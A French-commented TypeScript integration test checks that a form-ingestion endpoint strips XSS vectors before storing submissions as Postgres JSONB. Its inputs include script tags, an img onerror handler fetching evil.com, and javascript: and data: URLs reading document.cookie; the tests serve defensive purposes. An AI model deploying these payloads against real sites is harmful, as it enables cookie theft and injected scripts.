/**
 * ════════════════════════════════════════════════════════════════════════════
 * xss-sanitization.integration.test.ts — T3
 * ════════════════════════════════════════════════════════════════════════════
 *
 * Le payload `data` d'un form est stocké en JSONB Postgres. Un attaquant peut
 * y mettre `<script>`, `<img onerror=...>`, `javascript:`. `sanitizePayload`
 * strippe ces vecteurs AVANT le stockage (défense en profondeur — le rendu
 * front doit aussi échapper).
 *
 * Ce test vérifie le contenu RÉEL relu depuis Postgres (colonne JSONB `data`) :
 * pas de balise HTML, pas de protocole dangereux, structure préservée. Un test
 * sur FakePrisma ne prouverait pas que le JSONB Postgres round-trip proprement.
 * ════════════════════════════════════════════════════════════════════════════
 */

import { test, before, after, beforeEach } from "node:test";
import assert from "node:assert/strict";
import {
  bootBridgeWithRealDB,
  resetDb,
  seedTenant,
  seedSite,
  type BridgeHarness,
} from "../_harness/index.js";

let h: BridgeHarness;

before(async () => {
  h = await bootBridgeWithRealDB();
});

after(async () => {
  await h.close();
});

beforeEach(async () => {
  await resetDb(h.prisma);
});

/** POST un form, renvoie la row FormSubmission relue depuis Postgres. */
async function ingestAndReread(
  siteKey: string,
  data: Record<string, unknown>,
) {
  const res = await fetch(`${h.url}/api/ingest/form`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ siteKey, formSlug: "contact", data }),
  });
  assert.equal(res.status, 200);
  const body = (await res.json()) as { submissionId: string };
  const row = await h.prisma.formSubmission.findUniqueOrThrow({
    where: { id: body.submissionId },
  });
  return row.data as Record<string, unknown>;
}

// ─── 1. <script> strippé du JSONB stocké ────────────────────────────────────

test("xss: <script> est strippé du payload stocké en Postgres", async () => {
  const tenant = await seedTenant(h.prisma);
  await seedSite(h.prisma, tenant.id, { siteKey: "pk_xss1" });

  const stored = await ingestAndReread("pk_xss1", {
    email: "attacker@example.com",
    message: 'Bonjour <script>alert("xss")</script> fin',
  });

  const message = stored.message as string;
  assert.ok(
    !message.includes("<script>"),
    "la balise <script> doit être strippée",
  );
  assert.ok(
    !message.includes("</script>"),
    "la balise fermante </script> doit être strippée",
  );
  // Le texte légitime autour est conservé.
  assert.ok(message.includes("Bonjour"), "le texte légitime reste");
  assert.ok(message.includes("fin"), "le texte légitime reste");
});

// ─── 2. <img onerror=...> strippé ───────────────────────────────────────────

test("xss: <img onerror> et attributs malveillants strippés", async () => {
  const tenant = await seedTenant(h.prisma);
  await seedSite(h.prisma, tenant.id, { siteKey: "pk_xss2" });

  const stored = await ingestAndReread("pk_xss2", {
    email: "x@example.com",
    bio: '<img src=x onerror="fetch(\'//evil.com\')">texte',
  });

  const bio = stored.bio as string;
  assert.ok(!bio.includes("<img"), "la balise <img> doit être strippée");
  assert.ok(!bio.includes("onerror"), "l'attribut onerror doit disparaître");
  assert.ok(bio.includes("texte"), "le texte légitime reste");
});

// ─── 3. protocole javascript: blanchi ───────────────────────────────────────

test("xss: protocole javascript: est neutralisé en blocked:", async () => {
  const tenant = await seedTenant(h.prisma);
  await seedSite(h.prisma, tenant.id, { siteKey: "pk_xss3" });

  const stored = await ingestAndReread("pk_xss3", {
    email: "y@example.com",
    website: "javascript:alert(document.cookie)",
    link: "data:text/html,<script>x</script>",
  });

  const website = stored.website as string;
  assert.ok(
    !website.toLowerCase().includes("javascript:"),
    "le protocole javascript: doit être neutralisé",
  );
  assert.ok(website.includes("blocked:"), "remplacé par blocked:");

  const link = stored.link as string;
  assert.ok(
    !link.toLowerCase().includes("data:"),
    "le protocole data: doit être neutralisé",
  );
});

// ─── 4. Sanitization récursive : objets imbriqués ───────────────────────────

test("xss: la sanitization est récursive (objets + arrays imbriqués)", async () => {
  const tenant = await seedTenant(h.prisma);
  await seedSite(h.prisma, tenant.id, { siteKey: "pk_xss4" });

  const stored = await ingestAndReread("pk_xss4", {
    email: "nested@example.com",
    nested: {
      comment: 'inner <script>evil()</script>',
      tags: ["<b>bold</b>", "ok"],
    },
  });

  // La structure JSONB est préservée par le round-trip Postgres.
  const nested = stored.nested as { comment: string; tags: string[] };
  assert.ok(
    !nested.comment.includes("<script>"),
    "le <script> imbriqué doit être strippé",
  );
  assert.ok(
    !nested.tags[0].includes("<b>"),
    "les balises dans un array imbriqué doivent être strippées",
  );
  assert.equal(nested.tags[1], "ok", "les valeurs légitimes restent intactes");
});

// ─── 5. Données légitimes intactes (faux positif zéro) ──────────────────────

test("xss: une saisie légitime sans HTML traverse intacte", async () => {
  const tenant = await seedTenant(h.prisma);
  await seedSite(h.prisma, tenant.id, { siteKey: "pk_xss5" });

  const stored = await ingestAndReread("pk_xss5", {
    email: "legit@example.com",
    name: "Jean-Pierre O'Brien",
    message: "Bonjour, je voudrais un devis pour 3 produits. Merci !",
    budget: 1500,
    urgent: true,
  });

  assert.equal(stored.name, "Jean-Pierre O'Brien");
  assert.equal(
    stored.message,
    "Bonjour, je voudrais un devis pour 3 produits. Merci !",
  );
  assert.equal(stored.budget, 1500, "les nombres traversent intacts");
  assert.equal(stored.urgent, true, "les booléens traversent intacts");
});
